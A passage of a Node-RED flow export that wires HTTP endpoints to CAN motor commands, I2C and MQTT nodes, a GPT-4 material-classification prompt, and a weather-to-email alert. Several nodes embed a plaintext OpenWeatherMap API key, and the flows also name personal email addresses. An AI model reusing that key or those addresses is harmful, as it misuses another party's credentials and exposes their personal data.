        "id": "06b75fc9323cb91b",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/sms",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 640,
        "y": 220,
        "wires": [
            [
                "684eb3a443c7f8dc"
            ]
        ]
    },
    {
        "id": "9e9a66f29010aabc",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/ss1",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 640,
        "y": 280,
        "wires": [
            [
                "54113414af11cbef"
            ]
        ]
    },
    {
        "id": "be61630e0a206835",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/ss2",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 640,
        "y": 340,
        "wires": [
            [
                "2070b3c0df1fcf7f"
            ]
        ]
    },
    {
        "id": "2716ce7564503111",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "Position mode initialisation",
        "func": "msg.payload = \"1200007f#0570000001000000\"\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 160,
        "wires": [
            [
                "2a722581531d456c"
            ]
        ]
    },
    {
        "id": "8dd33276fce5e9c4",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "Position mode start",
        "func": "msg.payload = \"0x300007f#\"\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 270,
        "y": 240,
        "wires": [
            [
                "2a722581531d456c"
            ]
        ]
    },
    {
        "id": "bd455abd4e6ce22b",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "Send position 1",
        "func": "msg.payload = \"1200007f#16700000C3F54840\"\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 260,
        "y": 300,
        "wires": [
            [
                "2a722581531d456c"
            ]
        ]
    },
    {
        "id": "5e68d21c8162f25e",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "Send position 2",
        "func": "msg.payload = \"1200007f#1670000000000000\"\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 260,
        "y": 360,
        "wires": [
            [
                "2a722581531d456c"
            ]
        ]
    },
    {
        "id": "aca76b5d523870c3",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "stop",
        "func": "msg.payload = \"400007f#00000000000000\"\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 250,
        "y": 420,
        "wires": [
            [
                "2a722581531d456c"
            ]
        ]
    },
    {
        "id": "fbdec48d0eea5b56",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/stop",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 640,
        "y": 420,
        "wires": [
            [
                "6d859d64ce69f0f9"
            ]
        ]
    },
    {
        "id": "6d859d64ce69f0f9",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "stop",
        "func": "msg.payload = \"400007f#00000000000000\"\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 810,
        "y": 420,
        "wires": [
            [
                "684a1c998b641a05"
            ]
        ]
    },
    {
        "id": "4bbe35b95f40bde3",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "Speed mode initialisation",
        "func": "msg.payload = \"1200007f#0570000002000000\"\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 830,
        "y": 160,
        "wires": [
            [
                "684a1c998b641a05"
            ]
        ]
    },
    {
        "id": "684eb3a443c7f8dc",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "Speed mode start",
        "func": "msg.payload = \"0x300007f#\"\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 810,
        "y": 220,
        "wires": [
            [
                "684a1c998b641a05"
            ]
        ]
    },
    {
        "id": "54113414af11cbef",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "5RAD",
        "func": "msg.payload = \"1200007f#0A7000000000A040\"\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 790,
        "y": 280,
        "wires": [
            [
                "684a1c998b641a05"
            ]
        ]
    },
    {
        "id": "2070b3c0df1fcf7f",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "25rad",
        "func": "msg.payload = \"1200007f#0A7000000000C841\"\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 790,
        "y": 340,
        "wires": [
            [
                "684a1c998b641a05"
            ]
        ]
    },
    {
        "id": "9cd825848242d3fc",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/st",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 110,
        "y": 480,
        "wires": [
            [
                "198ef0f504408768"
            ]
        ]
    },
    {
        "id": "198ef0f504408768",
        "type": "function",
        "z": "4024900d334e5de4",
        "name": "speed test",
        "func": "msg.payload = \"1100007f#0A7000000000\"\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 270,
        "y": 480,
        "wires": [
            [
                "4f3dcf1bb9d56b31"
            ]
        ]
    },
    {
        "id": "f2e506f7f8493769",
        "type": "mqtt out",
        "z": "4024900d334e5de4",
        "name": "",
        "topic": "",
        "qos": "0",
        "retain": "false",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "ae6927223f6678b0",
        "x": 570,
        "y": 640,
        "wires": []
    },
    {
        "id": "61abeb0fac389710",
        "type": "mqtt out",
        "z": "4024900d334e5de4",
        "name": "",
        "topic": "",
        "qos": "0",
        "retain": "false",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "ae6927223f6678b0",
        "x": 1330,
        "y": 580,
        "wires": []
    },
    {
        "id": "1431d96ad6034328",
        "type": "mqtt out",
        "z": "4024900d334e5de4",
        "name": "",
        "topic": "",
        "qos": "0",
        "retain": "false",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "ae6927223f6678b0",
        "x": 1350,
        "y": 800,
        "wires": []
    },
    {
        "id": "c3b8426cd216f593",
        "type": "mqtt out",
        "z": "4024900d334e5de4",
        "name": "",
        "topic": "",
        "qos": "0",
        "retain": "false",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "ae6927223f6678b0",
        "x": 1690,
        "y": 360,
        "wires": []
    },
    {
        "id": "4310ac0215cbd427",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/cr",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 1090,
        "y": 220,
        "wires": [
            [
                "d1895c8711b71d7a"
            ]
        ]
    },
    {
        "id": "496380dae248f36f",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/cf",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 1110,
        "y": 320,
        "wires": [
            [
                "60a3e0dedfac386c"
            ]
        ]
    },
    {
        "id": "c5295a20129678b7",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/scanner",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 850,
        "y": 640,
        "wires": [
            [
                "7f6c5bd969b95419"
            ]
        ]
    },
    {
        "id": "1878e7ac8ad4c696",
        "type": "http in",
        "z": "4024900d334e5de4",
        "name": "",
        "url": "/rfid",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 840,
        "y": 740,
        "wires": [
            [
                "25fdc8a3f678199d"
            ]
        ]
    },
    {
        "id": "766aeb3138b0f9af",
        "type": "i2c scan",
        "z": "4024900d334e5de4",
        "name": "",
        "busno": "1",
        "x": 1290,
        "y": 400,
        "wires": [
            [
                "ab40f77e5e6b097a"
            ],
            [
                "ab40f77e5e6b097a"
            ]
        ]
    },
    {
        "id": "60a3e0dedfac386c",
        "type": "i2c in",
        "z": "4024900d334e5de4",
        "name": "",
        "busno": "1",
        "address": "50",
        "command": "32",
        "count": "16",
        "x": 1270,
        "y": 320,
        "wires": [
            [
                "6947c724bc9ff29a",
                "2e2b3e1fb4758133"
            ]
        ]
    },
    {
        "id": "c84822046af4459f",
        "type": "i2c out",
        "z": "4024900d334e5de4",
        "name": "",
        "busno": "1",
        "address": "50",
        "command": "32",
        "payload": "payload",
        "payloadType": "msg",
        "count": "8",
        "x": 1440,
        "y": 220,
        "wires": [
            [
                "ba115b786b4f6353"
            ]
        ]
    },
    {
        "id": "6de5a0adc34f2f1f",
        "type": "function-gpt",
        "z": "d98afa79b0ed0db4",
        "name": "GPT AI Coding",
        "config": "7bc909f23547b29f",
        "func": "//$PROMPT: make input double\n\n// Get the input data from payload\nlet inputData = msg.payload;\n\n// Check if the input data is a number\nif (typeof inputData === 'number') {\n    // Double the input data\n    msg.payload = inputData * 2;\n} else {\n    // Print an error message if the input data is not a number\n    node.error(\"The input data is not a number\");\n}\n\n// Return the updated message object\nreturn msg;\n\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 280,
        "y": 200,
        "wires": [
            [
                "6f3ccd80c62947d6"
            ]
        ]
    },
    {
        "id": "e88d25873db21f2d",
        "type": "comment",
        "z": "d98afa79b0ed0db4",
        "name": "Weather Alert",
        "info": "",
        "x": 750,
        "y": 100,
        "wires": []
    },
    {
        "id": "766c92e4e490728e",
        "type": "comment",
        "z": "d98afa79b0ed0db4",
        "name": "Free Programming",
        "info": "",
        "x": 130,
        "y": 100,
        "wires": []
    },
    {
        "id": "3d5de6ea8186c2aa",
        "type": "inject",
        "z": "d98afa79b0ed0db4",
        "name": "Input",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "2",
        "payloadType": "num",
        "x": 110,
        "y": 200,
        "wires": [
            [
                "6de5a0adc34f2f1f"
            ]
        ]
    },
    {
        "id": "6f3ccd80c62947d6",
        "type": "debug",
        "z": "d98afa79b0ed0db4",
        "name": "debug 1",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 460,
        "y": 200,
        "wires": []
    },
    {
        "id": "e695b2348c9267c2",
        "type": "comment",
        "z": "d98afa79b0ed0db4",
        "name": "Material Inbound",
        "info": "",
        "x": 120,
        "y": 420,
        "wires": []
    },
    {
        "id": "555813b4e6a1336e",
        "type": "http request",
        "z": "d98afa79b0ed0db4",
        "name": "GPT Sorting",
        "method": "POST",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://api.openai.com/v1/chat/completions",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "bearer",
        "senderr": false,
        "headers": [
            {
                "keyType": "Content-Type",
                "keyValue": "",
                "valueType": "application/json",
                "valueValue": ""
            }
        ],
        "x": 230,
        "y": 900,
        "wires": [
            [
                "4384f62165b5422a"
            ]
        ]
    },
    {
        "id": "691496d3b62bd573",
        "type": "function-gpt",
        "z": "d98afa79b0ed0db4",
        "name": "GPT Sorting Prompt",
        "config": "44c9c8af11a9f982",
        "func": "// 确保msg.payload是可以迭代的\nif (msg.payload && typeof msg.payload === 'object' && !Array.isArray(msg.payload)) {\n    // 如果msg.payload是对象，则取其值作为数组\n    msg.payload = Object.values(msg.payload);\n} else if (!Array.isArray(msg.payload)) {\n    // 如果msg.payload不是对象也不是数组，则将其放入数组中\n    msg.payload = [msg.payload];\n}\n\n// 使用.map方法生成新的消息数组\nlet messagesToSend = msg.payload.map(value => {\n    return {\n        payload: {\n            model: \"gpt-4\",\n            messages: [{\n                role: 'user',\n                content:\n                    '尝试理解以下一级类目的含义和特点，括号中的是解释：工业检测,实验室产品,安防消防,电线电缆,电工器材,配电及控制元件,工业自动化,工具,照明,办公用品,通信设备,劳动防护,清洁用品及设备,控制系统,现场仪表,计算机及外设,盘装仪表,机械,工具耗材,存储,量具,焊接,刀具,搬运,紧固,密封,制冷|暖通|通风除尘,包材,胶粘,润滑,车间化学品,泵管阀,工位,建筑材料,轴承。综合我输入的JSON信息，那将是包含一些工业用产品物料的信息，然后根据你的综合理解，推测它最可能属于哪一个一级类目，要按照物品本身的属性推测，而不要依据使用场景或其所属系统分类。如果你很不确定属于哪类，则分为“人工”类。最终输出item描述和对应类别的JSON，格式严格遵循{\"一级类目\"：{一级类目}}，其余键值对不要返回，你给我的回答应该只包括最后的JSON，以下是我的输入JSON:' + value                     }]\n        }\n    };\n});\n\n// 将要发送的消息数组存储在流的上下文中，以便跨消息调用持久化\nflow.set(\"messagesToSend\", messagesToSend);\n\n// 调用发送函数\nsendNext();\n\n// 定义发送函数\nfunction sendNext() {\n    let messages = flow.get(\"messagesToSend\") || [];\n    let nextMessage = messages.shift(); // 获取数组中的下一条消息\n    flow.set(\"messagesToSend\", messages); // 更新剩余消息数组\n    if (nextMessage) {\n        node.send(nextMessage); // 发送消息\n        // 如果还有消息要发送，调用此函数来延迟下一次发送\n        if (messages.length > 0) {\n            setTimeout(sendNext, 5000); // 5秒后再次发送\n        }\n    }\n}\n\nreturn null; // 防止在输出中直接发送任何消息\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 1220,
        "y": 700,
        "wires": [
            [
                "555813b4e6a1336e"
            ]
        ]
    },
    {
        "id": "83945875586a56e7",
        "type": "json",
        "z": "d98afa79b0ed0db4",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 1030,
        "y": 700,
        "wires": [
            [
                "691496d3b62bd573"
            ]
        ]
    },
    {
        "id": "717bee6ae93bc3fa",
        "type": "function",
        "z": "d98afa79b0ed0db4",
        "name": "Extract Category",
        "func": "\nmsg.payload=flow.get('payload')\nmsg.origin = flow.get('originO')\n\nvar jsonObj\nvar temp\ntry {\njsonObj = JSON.parse(msg.payload);\nmsg.temp = jsonObj.choices[0].message.content\n\n\n\nvar jsonObjTemp = JSON.parse(msg.temp);\n    msg.jsonObjTemp = jsonObjTemp\n\nif (jsonObjTemp[\"类别\"] != null) {\n    temp = jsonObjTemp[\"类别\"]\n} else if (jsonObjTemp.category != null) {\n    temp = jsonObjTemp.category\n} else if (jsonObjTemp[\"一级类目\"] != null) {\n    temp = jsonObjTemp[\"一级类目\"]\n} else if (jsonObjTemp[\"物料类别\"] != null) {\n    temp = jsonObjTemp[\"物料类别\"]\n}\n\n\n\n} \ncatch (error) {\n}\nif (temp != undefined) {\n    msg.msg = temp\n\n}\n\n\nfor (let index = 0; index < msg.origin.length; index++) {\n   msg.test= msg.origin[index]\n msg.origin[index]['类别'] = jsonObjTemp[index]['一级类目']\n}\n\nreturn msg\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 690,
        "y": 900,
        "wires": [
            [
                "a2309e9f6357c8e7",
                "fe73b0dd3b21c8cf"
            ]
        ]
    },
    {
        "id": "523a921a77767af2",
        "type": "function",
        "z": "d98afa79b0ed0db4",
        "name": "循环数据数量设置",
        "func": "flow.set('loop',msg.loop.value)\nvar origin = flow.get('origin')\nvar end = msg.loop.value * 5+3\nvar start = end-1\n\nfor (let index = start; index <= end; index++) {\n    var originO\n\nif (msg.payload != null && msg.payload != undefined){\n    var temp ={\n        //    \"物料编码\":origin[index]['物料编码'],\n        \"物料描述\": origin[index]['物料描述']\n    }\n    msg.payload = msg.payload + ',' + JSON.stringify(temp)\n    originO = originO + ',' + JSON.stringify(origin[index])\n}else {\n    msg.payload = {\n        // \"物料编码\":origin[index]['物料编码'],\n        \"物料描述\": origin[index]['物料描述']\n    }\n    msg.payload= JSON.stringify(msg.payload);\n    originO = JSON.stringify(origin[index])\n\n}\n\n    if (index==end){\n        msg.payload='['+msg.payload +']'\n        msg.payload=JSON.parse(msg.payload);\n\n        var test = '['+originO +']'\n        msg.test =JSON.parse(test)\n        flow.set('originO',JSON.parse(test))\n        \n    }\n}\n\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 850,
        "y": 700,
        "wires": [
            [
                "83945875586a56e7",
                "85ad0b5582ac67d2"
            ]
        ]
    },
    {
        "id": "4384f62165b5422a",
        "type": "function",
        "z": "d98afa79b0ed0db4",
        "name": "Raw Data Replace",
        "func": "flow.set(\"payload\",msg.payload)\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 450,
        "y": 900,
        "wires": [
            [
                "717bee6ae93bc3fa"
            ]
        ]
    },
    {
        "id": "eb9bfb5611231d66",
        "type": "function",
        "z": "d98afa79b0ed0db4",
        "name": "Save Initial Material Info",
        "func": "var temp = msg.payload\nflow.set(\"origin\", temp)\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 410,
        "y": 700,
        "wires": [
            [
                "a2309e9f6357c8e7"
            ]
        ]
    },
    {
        "id": "697bfec254b25cdf",
        "type": "function",
        "z": "d98afa79b0ed0db4",
        "name": "Format Material Info",
        "func": "msg.payload = JSON.parse(msg.payload);\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 140,
        "y": 700,
        "wires": [
            [
                "116bf793f22561b7",
                "eb9bfb5611231d66"
            ]
        ]
    },
    {
        "id": "116bf793f22561b7",
        "type": "debug",
        "z": "d98afa79b0ed0db4",
        "name": "debug 5",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 380,
        "y": 640,
        "wires": []
    },
    {
        "id": "cf3c4c7febdb0ac5",
        "type": "inject",
        "z": "d98afa79b0ed0db4",
        "name": "Time Stamp",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 110,
        "y": 500,
        "wires": [
            [
                "adb2049b03a2dbb1"
            ]
        ]
    },
    {
        "id": "adb2049b03a2dbb1",
        "type": "http request",
        "z": "d98afa79b0ed0db4",
        "name": "HTTP GET",
        "method": "GET",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://apaas-r4xv.saas.supos.io/api/config/download?fileName=2023-11-05%2F1699189640163%2F2221.json",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 130,
        "y": 600,
        "wires": [
            [
                "697bfec254b25cdf"
            ]
        ]
    },
    {
        "id": "85ad0b5582ac67d2",
        "type": "debug",
        "z": "d98afa79b0ed0db4",
        "name": "debug 6",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1060,
        "y": 620,
        "wires": []
    },
    {
        "id": "a2309e9f6357c8e7",
        "type": "loop",
        "z": "d98afa79b0ed0db4",
        "name": "循环次数设置",
        "kind": "fcnt",
        "count": "4",
        "initial": "1",
        "step": "1",
        "condition": "",
        "conditionType": "js",
        "when": "before",
        "enumeration": "5387",
        "enumerationType": "flow",
        "limit": "",
        "loopPayload": "loop-key",
        "finalPayload": "final-count",
        "x": 640,
        "y": 700,
        "wires": [
            [],
            [
                "523a921a77767af2"
            ]
        ]
    },
    {
        "id": "c17e5d9feaef2cc8",
        "type": "debug",
        "z": "d98afa79b0ed0db4",
        "name": "debug 3",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1140,
        "y": 220,
        "wires": []
    },
    {
        "id": "94fd34ba6759505f",
        "type": "http request",
        "z": "d98afa79b0ed0db4",
        "name": "HTTP",
        "method": "GET",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "http://api.openweathermap.org/data/2.5/weather?q=Hangzhou&appid=52b0b4f1827f51c0426ad2b1c2d3e354",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 910,
        "y": 220,
        "wires": [
            [
                "c17e5d9feaef2cc8",
                "2db332e9b6419d91"
            ]
        ]
    },
    {
        "id": "710c2e377c479b4e",
        "type": "inject",
        "z": "d98afa79b0ed0db4",
        "name": "Time Stamp",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 730,
        "y": 220,
        "wires": [
            [
                "94fd34ba6759505f"
            ]
        ]
    },
    {
        "id": "6befeb713dc7c6bf",
        "type": "function",
        "z": "d98afa79b0ed0db4",
        "name": "Send Email",
        "func": "// // Parse the string to a JSON object\n// let data = msg.payload;\n\n// // Initialize the message string\n// let message = \"\";\n\n// // Check if necessary data is available\n// if (data.name && data.main && data.main.temp && data.wind && data.wind.speed) {\n//     let tempInKelvin = data.main.temp;\n//     let tempInCelsius = tempInKelvin - 273.15;\n//     let cityName = data.name;\n//     let windSpeed = data.wind.speed;\n\n//     // Construct the message\n//     message = `${cityName} today is ${tempInCelsius.toFixed(2)} ℃, wind speed: ${windSpeed.toFixed(2)} m/s`;\n// } else {\n//     // Handle the case where some data is not defined\n//     message = \"Complete weather data not available\";\n// }\n\n// // Set the message to payload\n// msg.payload = message;\n\n// return msg;\n// Parse the string to a JSON object\n// let data = msg.payload;\n\n// // Initialize the message string\n// let message = \"\";\n\n// // Check if necessary data is available\n// if (data.name && data.main && data.main.temp && data.wind && data.wind.speed) {\n//     let tempInKelvin = data.main.temp;\n//     let tempInCelsius = tempInKelvin - 273.15;\n//     let cityName = data.name;\n//     let windSpeed = data.wind.speed;\n\n//     // Construct the message\n//     message = `${cityName} today is ${tempInCelsius.toFixed(2)} ℃, wind speed: ${windSpeed.toFixed(2)} m/s`;\n// } else {\n//     // Handle the case where some data is not defined\n//     message = \"Complete weather data not available\";\n// }\n\n// // Set the message to payload for email\n// // msg.payload = {\n// //     text: message\n// // };\n// msg.payload = message;\n// msg.topic = \"这是一个天气预报邮件\";\n// msg.from = \"supOS天气服务 <458744713@qq.com>\";\n// msg.to = \"supOS天气服务 <renzhanxiang@freezonex.io>,supOS天气服务 <458744713@qq.com>\";  // 收件人\n// // msg.cc = \"458744713@qq.com\";  // 抄送\n// // msg.bcc = \"458744713@qq.com\";  // 密送\n// return msg;\nlet data = msg.payload;\n\n// Initialize the message string\nlet message = \"\";\n\n// Check if necessary data is available\nif (data.name && data.main && data.main.temp && data.wind && data.wind.speed) {\n    let tempInKelvin = data.main.temp;\n    let tempInCelsius = tempInKelvin - 273.15;\n    let cityName = data.name;\n    let windSpeed = data.wind.speed;\n\n    // Check if temperature is less than 25 degrees Celsius\n    if (tempInCelsius < 30) {\n        // Construct the message\n        message = `${cityName} today is ${tempInCelsius.toFixed(2)} ℃, wind speed: ${windSpeed.toFixed(2)} m/s`;\n\n        // Set the message to payload for email\n        msg.payload = message;\n        msg.topic = \"这是一个天气预报邮件\";\n        msg.from = \"supOS天气服务 <458744713@qq.com>\";\n        // msg.to = \"supOS天气服务 <renzhanxiang@freezonex.io>\";  // 收件人\n        // msg.cc = \"458744713@qq.com\";  // 抄送\n        // msg.bcc = \"458744713@qq.com\";  // 密送\n    } else {\n        // Do not send an email if temperature is 25 degrees or higher\n        return null;\n    }\n} else {\n    // Handle the case where some data is not defined\n    message = \"Complete weather data not available\";\n    // Optionally, handle this case as required (e.g., log a message)\n}\n\nreturn msg;\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 950,
        "y": 300,
        "wires": [
            [
                "9a7510bbc5e97591",
                "f0734f91979b142a"
            ]
        ]
    },
    {
        "id": "9a7510bbc5e97591",
        "type": "debug",
        "z": "d98afa79b0ed0db4",
        "name": "debug 4",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1140,
        "y": 300,
        "wires": []
    },
    {
        "id": "2db332e9b6419d91",
        "type": "json",
        "z": "d98afa79b0ed0db4",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 790,
        "y": 300,
        "wires": [
            [
                "6befeb713dc7c6bf"
            ]
        ]
    },
    {
        "id": "f0734f91979b142a",
        "type": "e-mail",
        "z": "d98afa79b0ed0db4",
        "server": "smtp.qq.com",
        "port": "465",
        "authtype": "BASIC",
        "saslformat": true,
        "token": "oauth2Response.access_token",
        "secure": true,
        "tls": true,
        "name": "809840905@qq.com",
        "dname": "Receiver",
        "x": 940,
        "y": 380,
        "wires": []
    },
    {
        "id": "f8a44eab52f81297",
        "type": "function-gpt",
        "z": "d98afa79b0ed0db4",
        "name": "GPT AI Request URL",
        "config": "7bc909f23547b29f",
        "func": "//$PROMPT: Check the current weather in Hangzhou\n\n// Note: For this kind of function we would need to make a http request to a weather API such as openweathermap, but require() is not allowed based on the instructions.\nlet api_url = \"http://api.openweathermap.org/data/2.5/weather\";  // The API URL\nlet city = \"Hangzhou\";                                             // The city \nlet api_key = \"52b0b4f1827f51c0426ad2b1c2d3e354\";                                      // Your api key\nmsg.url = `${api_url}?q=${city}&appid=${api_key}`;                 // Build the url\n\nreturn msg;\n\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "\n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 960,
        "y": 160,
        "wires": [
            [
                "8f22a10be4dd756f"
            ]
        ]
    },
    {
        "id": "1d51f207a5f76f8a",
        "type": "inject",
        "z": "d98afa79b0ed0db4",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "str",
        "x": 710,
        "y": 160,
        "wires": [
            [
                "f8a44eab52f81297"
            ]
        ]
    },
    {
        "id": "fe73b0dd3b21c8cf",
        "type": "debug",
        "z": "d98afa79b0ed0db4",
        "name": "debug 7",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "jsonObjTemp",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 940,
        "y": 900,
        "wires": []
    },
    {
        "id": "8f22a10be4dd756f",
        "type": "debug",
        "z": "d98afa79b0ed0db4",
        "name": "debug 2",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1160,
        "y": 160,
        "wires": []
    },
    {
        "id": "8404974e9e956d9b",
        "type": "debug",
        "z": "b94ab84a0cc55a32",
        "name": "debug 48",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 880,
        "y": 280,
        "wires": []
    },
    {
        "id": "f3df40f4b33818c7",
        "type": "http request",
        "z": "b94ab84a0cc55a32",
        "name": "",
        "method": "GET",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "http://api.openweathermap.org/data/2.5/weather?q=Hangzhou&appid=52b0b4f1827f51c0426ad2b1c2d3e354",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 680,
        "y": 280,
        "wires": [
            [
                "8404974e9e956d9b",
                "31199657579e73c0"
            ]
        ]
    },
    {
        "id": "650c19b46caff61b",
        "type": "inject",
        "z": "b94ab84a0cc55a32",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 510,
        "y": 280,
        "wires": [
            [
                "f3df40f4b33818c7"
            ]
        ]
    },
    {
        "id": "ca37aed38debc67c",
        "type": "function",
        "z": "b94ab84a0cc55a32",
        "name": "function 33",
